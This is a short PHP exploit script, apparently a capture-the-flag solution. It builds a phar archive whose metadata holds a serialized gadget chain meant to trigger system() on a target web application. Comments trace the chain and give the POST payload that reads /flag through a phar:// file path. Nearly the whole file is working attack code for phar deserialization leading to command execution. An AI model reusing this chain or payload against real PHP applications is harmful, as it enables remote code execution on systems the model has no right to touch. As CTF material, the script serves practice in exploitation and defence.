<?php
//$filename=$_POST['file'];
//$file=new zz($filename);
//$contents=$file->getFile();

//new zz()->zz:__construct:$filename
//$contents=$file->getFile():$contents=file_get_contents($filename)

#pop_chains:
#phar://$filename->unserialize():
#a=new aa()->aa:__construct:$name=new zz()->zz:__construct:filename=new ff()->ff:__construct:$func=system,
#$content=new xx()->ff:__get:$_POST['command']=cat /flag,$content=$key=system(cat /flag),xx:__construct:$name,$arg
#aa:__destruct:strtolower($name)->zz:__toString:$_POST['method']=write&$_POST['var']=content,write($content=new xx())
#->xx:__call:$name=$func=$system,$arg[0]=cat /flag

#payload:
#POST:file=phar://upload/xxx.txt/test.txt&command=cat /flag&method=write$var=content

class aa{
    public $name;
}

class ff{
    private $content;
    public $func;

    public function __construct(){
        $this->content=new xx();
        $this->func='system';
    }
}

class zz{
    public $filename;
    public $content='surprise';

}

class xx{
    public $name;
    public $arg;
}

$aa1 = new aa();
$aa1->name=new zz();
$aa1->name->filename=new ff();

$phar = new Phar("phar.phar"); //后缀名必须为 phar
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置 stub
$phar->setMetadata($aa1); //将自定义的 meta-data 存入 manifest
$phar->addFromString("test.txt", "abc"); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();
?>
